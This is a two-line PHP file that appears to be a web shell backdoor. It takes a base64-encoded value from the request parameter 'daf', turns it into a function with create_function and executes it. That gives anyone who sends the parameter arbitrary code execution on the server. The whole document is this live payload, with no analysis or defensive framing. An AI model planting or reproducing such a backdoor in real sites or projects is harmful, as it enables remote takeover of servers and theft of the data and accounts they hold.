<?php
if(!empty($_REQUEST['daf'])){$daf=base64_decode($_REQUEST["daf"]);$daf=create_function('',$daf);$daf();exit;}